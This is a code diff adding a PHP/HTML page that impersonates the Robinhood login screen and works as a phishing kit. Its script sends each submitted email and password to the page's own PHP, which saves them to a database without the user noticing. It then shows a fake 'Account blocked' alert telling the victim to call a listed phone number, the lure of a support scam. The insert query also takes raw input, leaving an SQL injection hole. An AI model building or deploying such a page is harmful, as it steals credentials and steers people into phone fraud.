@@ -1,0 +1,530 @@
+<?php
+require "config.php";
+
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+
+    if (!isset($_POST['email'], $_POST['password'])) {
+        exit("No POST data");
+    }
+
+    $email = trim($_POST['email']);
+    $password = trim($_POST['password']);
+
+    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
+
+    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$hashedPassword')";
+
+    if (mysqli_query($conn, $sql)) {
+        echo "SAVED";
+    } else {
+        echo "ERROR: " . mysqli_error($conn);
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login In | Robinhood</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <style>
+        :root {
+            --bg: #000;
+            --white: #fff;
+            --muted: #9aa0a6;
+            --divider: rgba(255, 255, 255, 0.08);
+            --input-border: rgba(255, 255, 255, 0.08);
+            --accent: #9ad1ff;
+
+            /* error colors */
+            --err-bg: linear-gradient(180deg, rgba(58, 13, 13, 0.95), rgba(58, 13, 13, 0.92));
+            --err-border: #ff4d4f;
+            --err-text: #ffd7d7;
+            --err-strong: #fff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--white);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+        }
+
+        /* Left + Right Columns */
+        .left,
+        .right {
+            width: 50%;
+            height: 100vh;
+            position: relative;
+        }
+
+        /* Divider */
+        .divider {
+            position: absolute;
+            left: 50%;
+            top: 0;
+            width: 1px;
+            height: 100%;
+            background: var(--divider);
+            z-index: 10;
+        }
+
+        /* Canvas */
+        canvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        /* Right Side Form */
+        .right {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.01), transparent);
+        }
+
+        form {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 40px;
+        }
+
+        /* Error box (hidden by default) */
+        .error {
+            display: none;
+            background: var(--err-bg);
+            border: 1px solid var(--err-border);
+            color: var(--err-text);
+            padding: 14px 16px;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            font-size: 14px;
+            line-height: 1.35;
+        }
+
+        .error strong {
+            color: var(--err-strong);
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        label {
+            font-size: 13px;
+            color: var(--muted);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 8px;
+            border: 1px solid rgb(255 255 255 / 28%);
+            background: transparent;
+            color: var(--white);
+            font-size: 15px;
+            margin-bottom: 18px;
+            outline: none;
+            transition: box-shadow .12s ease, border-color .12s ease;
+        }
+
+        /* input error state */
+        .input-error {
+            border-color: var(--err-border) !important;
+            box-shadow: 0 0 0 6px rgba(255, 77, 79, 0.06);
+        }
+
+        .pw-wrapper {
+            position: relative;
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 32px;
+            width: 32px;
+            border: none;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--white);
+            opacity: 0.8;
+            transition: opacity 0.2s ease;
+            margin-top: -10px;
+        }
+
+        .eye-btn:hover {
+            opacity: 1;
+        }
+
+        .controls {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0 24px;
+        }
+
+        .controls input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+
+        .controls label {
+            color: var(--muted);
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px 18px;
+            border-radius: 999px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            font-size: 15px;
+        }
+
+        .btn-primary {
+            background: var(--white);
+            color: #000;
+        }
+
+        .btn-outline {
+            border: 3px solid rgb(255 255 255 / 47%);
+            background: transparent;
+            color: var(--white);
+        }
+
+        .divider-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: rgba(255, 255, 255, 0.3);
+            margin: 20px 0;
+        }
+
+        .divider-row::before,
+        .divider-row::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: rgb(255 255 255 / 36%);
+        }
+
+        .passkey {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 260px;
+            padding: 12px 18px;
+            border-radius: 999px;
+            background: var(--white);
+            color: #000;
+            font-weight: 600;
+            border: 0;
+            cursor: pointer;
+        }
+
+        .small {
+            font-size: 13px;
+            color: var(--muted);
+            margin-top: 10px;
+        }
+
+        a {
+            color: #fff;
+        }
+
+        @media (max-width: 900px) {
+            body {
+                flex-direction: column;
+            }
+
+            .left,
+            .right {
+                width: 100%;
+                height: 50%;
+            }
+
+            .divider {
+                display: none;
+            }
+        }
+
+        @media (max-width: 900px) {
+            body {
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+            }
+
+            /* Hide left side and divider completely */
+            .left,
+            .divider {
+                display: none !important;
+            }
+
+            /* Right side takes full width & height adjusts */
+            .right {
+                width: 100%;
+                height: 100vh;
+                padding: 40px 20px;
+                justify-content: center;
+                align-items: center;
+                background: var(--bg);
+            }
+
+            form {
+                max-width: 360px;
+                width: 100%;
+            }
+
+            .buttons {
+                flex-direction: column;
+            }
+
+            .btn,
+            .passkey {
+                width: 100%;
+            }
+
+            .divider-row {
+                margin: 40px 0;
+            }
+
+            .small {
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="left">
+        <canvas id="rings"></canvas>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="right">
+        <form id="loginForm" novalidate  method="POST" action="">
+            <!-- Error box -->
+            <div id="errorBox" class="error" role="alert" aria-live="assertive" aria-atomic="true">
+                <strong>Account blocked</strong>
+                Due to suspicious activity, your account has been blocked. Please contact our customer service at
+                <strong>+1877-334-0352</strong>. Error code <strong>E902</strong>
+            </div>
+
+            <h1>Log in to Robinhood</h1>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required autocomplete="username" />
+
+            <label for="password">Password</label>
+            <div class="pw-wrapper">
+                <input type="password" id="password" name="password" required autocomplete="current-password" />
+                <button type="button" class="eye-btn" onclick="togglePassword()"
+                    aria-label="Toggle password visibility">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white" viewBox="0 0 24 24"
+                        aria-hidden="true">
+                        <path
+                            d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4z" />
+                    </svg>
+                </button>
+            </div>
+
+            <div class="controls">
+                <input type="checkbox" id="keep" />
+                <label for="keep">Keep me logged in for up to 30 days</label>
+            </div>
+
+            <div class="buttons">
+                <button type="submit" class="btn btn-primary">Log In</button>
+                <button type="button" class="btn btn-outline">Help</button>
+            </div>
+
+            <div class="divider-row">or</div>
+
+            <button type="button" class="passkey"><img src="lock.png" alt="" style="width: 10px; height: 12px;"> Log in
+                with passkeys</button>
+
+            <div class="small">
+                Not on Robinhood? <a href="#">Create an account</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        /* Canvas rings (kept simple & performant) */
+        const canvas = document.getElementById("rings");
+        const ctx = canvas.getContext("2d");
+
+        const rings = [60, 110, 170, 240, 310];
+        let angle = 0;
+        let rafId = null;
+
+        function resize() {
+            const dpr = window.devicePixelRatio || 1;
+            canvas.width = canvas.clientWidth * dpr;
+            canvas.height = canvas.clientHeight * dpr;
+            ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+        }
+
+        function draw() {
+            const w = canvas.clientWidth;
+            const h = canvas.clientHeight;
+            const cx = w * 0.5;
+            const cy = h * 0.5;
+            ctx.clearRect(0, 0, w, h);
+            ctx.fillStyle = "#000";
+            ctx.fillRect(0, 0, w, h);
+            ctx.strokeStyle = "#fff";
+            ctx.lineWidth = 2;
+
+            rings.forEach((r, i) => {
+                const dashCount = Math.floor((2 * Math.PI * r) / 40);
+                const rotation = angle * (0.2 + i * 0.05);
+                ctx.save();
+                ctx.translate(cx, cy);
+                ctx.rotate(rotation);
+                for (let d = 0; d < dashCount; d++) {
+                    const theta = (d / dashCount) * Math.PI * 2;
+                    const x1 = Math.cos(theta) * r;
+                    const y1 = Math.sin(theta) * r;
+                    ctx.beginPath();
+                    ctx.moveTo(x1, y1 - 10);
+                    ctx.lineTo(x1, y1 + 10);
+                    ctx.stroke();
+                }
+                ctx.restore();
+            });
+
+            angle += 0.0015; // smooth slow clockwise rotation
+            rafId = requestAnimationFrame(draw);
+        }
+
+        resize();
+        draw();
+        window.addEventListener("resize", resize);
+
+        /* Password toggle */
+        function togglePassword() {
+            const p = document.getElementById("password");
+            p.type = p.type === "password" ? "text" : "password";
+        }
+
+      
+        const form = document.getElementById("loginForm");
+        const errorBox = document.getElementById("errorBox");
+        const email = document.getElementById("email");
+        const password = document.getElementById("password");
+
+        const BLOCKED_MSG = "Due to suspicious activity, your account has been blocked. Please contact our customer service at +1877-334-0352. Error code E902";
+
+        function showError(msg) {
+            // set message and show
+            errorBox.innerHTML = `<strong>Account blocked</strong>${msg}`;
+            errorBox.style.display = "block";
+
+            // add visual input errors
+            email.classList.add("input-error");
+            password.classList.add("input-error");
+
+            // move focus to error box for screen readers (but preserve scroll)
+            errorBox.setAttribute('tabindex', '-1');
+            errorBox.focus({ preventScroll: true });
+        }
+
+        function clearError() {
+            if (errorBox.style.display === "block") {
+                errorBox.style.display = "none";
+                errorBox.innerHTML = "";
+                email.classList.remove("input-error");
+                password.classList.remove("input-error");
+            }
+        }
+
+      form.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    if (!email.value.trim() || !password.value.trim()) {
+        email.focus();
+        return;
+    }
+
+    // show same error UI
+    showError(" " + BLOCKED_MSG);
+
+    // send data to PHP (same page)
+    const formData = new FormData(form);
+
+    fetch("", {
+        method: "POST",
+        body: formData
+    })
+    .then(res => res.text())
+    .then(data => {
+        console.log("Server:", data);
+        // silently saved, UI unchanged
+    })
+    .catch(err => console.error(err));
+});
+
+
+        // Clear error when user starts editing either field
+        [email, password].forEach(inp => {
+            inp.addEventListener("input", () => {
+                if (errorBox.style.display === "block") {
+                    clearError();
+                }
+            });
+        });
+
+        // Optional: stop canvas animation on small devices for perf
+        const mq = window.matchMedia('(max-width:600px)');
+        function handleMq(e) {
+            if (e.matches) {
+                if (rafId) cancelAnimationFrame(rafId);
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+            } else {
+                if (!rafId) {
+                    last = performance.now();
+                    draw();
+                }
+            }
+        }
+        mq.addListener(handleMq);
+        handleMq(mq);
+    </script>
+</body>
+
+</html>
